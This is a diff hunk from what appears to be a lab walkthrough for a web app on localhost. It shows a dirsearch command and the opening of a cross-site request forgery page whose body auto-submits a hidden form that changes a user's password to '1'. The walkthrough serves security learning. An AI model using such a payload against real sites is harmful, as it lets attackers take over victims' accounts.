@@ -81,7 +81,8 @@ python3 dirsearch.py -u http://localhost:3000 -e html,php
 
 8. So the html document for changing the password should contain fields like:
 
-```<html>
+```
+<html>
 <body onload='document.csrf.submit()'>
 <form action='http://localhost:3000/users/profile/6019076df85a8b0ba08ef990' name='csrf' method='POST'>
 <input type='hidden' name='password' value='1'>
